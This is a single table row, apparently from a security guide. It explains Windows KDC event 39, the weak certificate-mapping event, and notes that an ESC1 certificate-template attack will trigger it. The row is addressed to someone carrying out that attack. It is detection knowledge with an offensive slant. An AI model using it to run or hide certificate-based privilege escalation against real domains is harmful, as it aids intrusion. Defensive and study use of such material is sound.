| 39 | The KDC encountered a user certificate that was valid but could not be mapped to a user in a strong way. This is the generic weak-mapping event and the one your ESC1 will produce. Warning in compatibility mode, Error in full enforcement |
